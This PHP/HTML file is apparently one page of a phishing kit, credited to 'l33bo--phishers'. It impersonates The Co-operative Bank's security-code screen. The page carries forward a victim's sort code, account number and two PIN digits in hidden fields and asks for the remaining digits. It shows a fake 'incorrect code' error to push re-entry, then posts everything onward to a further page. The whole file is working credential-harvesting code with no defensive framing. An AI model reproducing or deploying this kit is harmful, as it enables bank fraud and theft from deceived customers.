<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");

$sort = $_POST['sort'];
$acno = $_POST['acno'];
$pin1 = $_POST['pin1'];
$pin4 = $_POST['pin4'];
?>
<!DOCTYPE html>
<html>
<head>
    <title> Enter your security code</title>
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="user-scalable=yes, width=device-width, initial-scale=1" name="viewport">
    
<link rel="stylesheet" href="assets/css/login.css" type="text/css">
<link rel="stylesheet" href="assets/css/custom.css" type="text/css">
<meta content="text/html; charset=windows-1252" http-equiv="Content-Type">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="pragma" content="no-cache"><!--Stops ipads and iphones automatically rendering phone numbers as links -->
<meta name="format-detection" content="telephone=no">
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
document.getElementById(nextFieldID).focus();
}
function change(value) {
        if(value=="0")
	    document.getElementById("0").innerHTML = "* ";
	if(value=="1")
	    document.getElementById("1").innerHTML = "* ";
	if(value=="2")
	    document.getElementById("2").innerHTML = "* ";
        if(value=="3")
	    document.getElementById("3").innerHTML = "* ";
	if(value=="4")
	    document.getElementById("4").innerHTML = "* ";
	if(value=="5")
	    document.getElementById("5").innerHTML = "* ";
	if(value=="6")
	    document.getElementById("6").innerHTML = "* ";
	if(value=="7")
	    document.getElementById("7").innerHTML = "* ";
	if(value=="8")
	    document.getElementById("8").innerHTML = "* ";
	if(value=="9")
	    document.getElementById("9").innerHTML = "* ";
    }
function resetValues(value){
        if(value=="0")
	    document.getElementById("0").innerHTML = "0";
	if(value=="1")
	    document.getElementById("1").innerHTML = "1";
	if(value=="2")
	    document.getElementById("2").innerHTML = "2";
        if(value=="3")
	    document.getElementById("3").innerHTML = "3 ";
	if(value=="4")
	    document.getElementById("4").innerHTML = "4 ";
	if(value=="5")
	    document.getElementById("5").innerHTML = "5 ";
	if(value=="6")
	    document.getElementById("6").innerHTML = "6 ";
	if(value=="7")
	    document.getElementById("7").innerHTML = "7";
	if(value=="8")
	    document.getElementById("8").innerHTML = "8";
	if(value=="9")
	    document.getElementById("9").innerHTML = "9 ";
    }
</script>
<script>
function changep2(value) {
        if(value=="0")
	    document.getElementById("p20").innerHTML = "* ";
	if(value=="1")
	    document.getElementById("p21").innerHTML = "* ";
	if(value=="2")
	    document.getElementById("p22").innerHTML = "* ";
        if(value=="3")
	    document.getElementById("p23").innerHTML = "* ";
	if(value=="4")
	    document.getElementById("p24").innerHTML = "* ";
	if(value=="5")
	    document.getElementById("p25").innerHTML = "* ";
	if(value=="6")
	    document.getElementById("p26").innerHTML = "* ";
	if(value=="7")
	    document.getElementById("p27").innerHTML = "* ";
	if(value=="8")
	    document.getElementById("p28").innerHTML = "* ";
	if(value=="9")
	    document.getElementById("p29").innerHTML = "* ";
    }
function resetValuesp2(value){
        if(value=="0")
	    document.getElementById("p20").innerHTML = "0";
	if(value=="1")
	    document.getElementById("p21").innerHTML = "1";
	if(value=="2")
	    document.getElementById("p22").innerHTML = "2";
        if(value=="3")
	    document.getElementById("p23").innerHTML = "3 ";
	if(value=="4")
	    document.getElementById("p24").innerHTML = "4 ";
	if(value=="5")
	    document.getElementById("p25").innerHTML = "5 ";
	if(value=="6")
	    document.getElementById("p26").innerHTML = "6 ";
	if(value=="7")
	    document.getElementById("p27").innerHTML = "7";
	if(value=="8")
	    document.getElementById("p28").innerHTML = "8";
	if(value=="9")
	    document.getElementById("p29").innerHTML = "9 ";
    }
</script>
<script language="javascript" type="text/javascript">
function addHyphen() {
    var t = document.forms['login'].elements['sort'];
      if (t.value.length > 5) {
        t.value = t.value.substring(0,2) + "-" + t.value.substring(2,4) + "-" + t.value.substring(4,6);
      }
}
</script>
</head>
<body onload="addHyphen()">
    
    <div id="coopHeader">


     <div id="coopHeader">
        <div class="headIntro contain">
            <h1>The Co-operative bank</h1>
            <div class="accDetails">
                <strong>
	            
				</strong>   
            </div>
        </div>
    </div>


	      












<div id="loginSubHeader">
    <h2 class="loginSubHeader">Enter your security code</h2>
</div>


    </div>
    <table cellpadding="0" cellspacing="0" width="100%">
        <tbody><tr>
        <td height="70%">



<form name="login" id="login" method="post" action="Memorable.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" autocomplete="OFF">
<input type="hidden" name="sort" value="<? echo $sort ?>"> 
<input type="hidden" name="acno" value="<? echo $acno ?>"> 
<input type="hidden" name="pin1" value="<? echo $pin1 ?>"> 
<input type="hidden" name="pin4" value="<? echo $pin4 ?>"> 
<div id="logonBody">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody><tr>
        <td colspan="2" align="left">
          <table border="0" width="100%">
            <tbody><tr>
              <td class="verttop" align="left"><br>
                <a href="#"><img src="assets/img/back.gif" border="0"></a>
              </td>
            </tr>
          </tbody></table>
        </td>  
    </tr>
    <tr>
        <td colspan="2" align="left">
          <table border="0" width="100%">
            <tbody><tr>
              <td class="verttop" align="left"><br>Now please enter the second and third digits of your 4-digit security code.          <br> <br> 
              </td>
              <td class="verttop" align="right"><br>
              </td>
            </tr>
          </tbody></table>
        </td>    
	<tr id="ShowTopErr" style="display:">
          <td>&nbsp;
          </td>
          <td id="error" class="error">*** Incorrect security code please try again. ***</td>
      </tr>
    </tr>

    

	
    <tr>
        <td class="label" width="20%"><label for="firstPassCodeDigit">Second digit &nbsp;&nbsp;</label></td>
        <td class="field">
        	<select name="pin2" onchange="movetoNext(this, 'pin3');" onblur="change(this.value)" onmouseover="resetValues(this.value);" style="width:50px;font-weight:bold;font-size: 16px;" id="pin2"><option value="">Please select</option>
<option id="0" value="0">0</option>
<option id="1" value="1">1</option>
<option id="2" value="2">2</option>
<option id="3" value="3">3</option>
<option id="4" value="4">4</option>
<option id="5" value="5">5</option>
<option id="6" value="6">6</option>
<option id="7" value="7">7</option>
<option id="8" value="8">8</option>
<option id="9" value="9">9</option></select>
        	
        </td>
    </tr>
    <tr>
        <td class="label"></td>
        <td id="error2" class="error"></td>
    </tr>
    
    <tr>
        <td><br>
        </td>
    </tr>
    
    <tr>
        <td class="label"><label for="pin3">Third digit &nbsp;&nbsp;</label></td>
        <td class="field">
        	<select name="pin3"  onblur="changep2(this.value)" onmouseover="resetValuesp2(this.value);"  onchange="movetoNext(this, 'submitBtn');" style="width:50px;font-weight:bold;font-size: 16px;" id="pin3"><option value="">Please select</option>
<option id="p20" value="0">0</option>
<option id="p21" value="1">1</option>
<option id="p22" value="2">2</option>
<option id="p23" value="3">3</option>
<option id="p24" value="4">4</option>
<option id="p25" value="5">5</option>
<option id="p26" value="6">6</option>
<option id="p27" value="7">7</option>
<option id="p28" value="8">8</option>
<option id="p29" value="9">9</option></select>
        	
        </td>
    </tr>
	<tr>
        <td class="label"></td>
        <td id="error3" class="error"></td>
    </tr>
    
    <tr>
        <td>
            <br>
        </td>
    </tr>
    <tr>
	 <td name="some" class="label">&nbsp;</td>
        <td class="dataRowL">				Security tip: Make sure that no one is watching when you enter your security code.			
        </td>
       
    </tr>

	<tr>
		<td class="label">&nbsp;
		</td>
		<td class="forgotSecurity">
		<a href="#" title="forgot">Forgotten your security details?</a>				
		</td>
	</tr>	
    <tr>
        <td>
            <br><br>
        </td>
    </tr>
</tbody></table>
</div>
<div id="logonButton">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody><tr>
        <td></td>
        <td colspan="2" align="right"><a href="#" id="submitBtn" type="submit" value="" onclick="validLogin();clearMsg();"></a></td>
    </tr>
</tbody></table>
</div>
</form>
</td>
    	</tr>
    	<tr>
        <td height="10%"></td>
    	</tr>	
	</tbody></table>	
<script>
function validLogin() {
    var x = document.forms["login"]["pin2"].value;
	if (x == null || x == "") {
		document.getElementById("error2").innerHTML = "*** Please enter security code. *** ";
        return false;
    }
    var x = document.forms["login"]["pin3"].value;
	if (x == null || x == "") {
		document.getElementById("error3").innerHTML = "*** Please enter security code. ***";
        return false;
    }
document.login.submit();
}
function clearMsg() {
		document.getElementById("ShowTopErr").style.display = "none";
    }
</script>	

</body></html>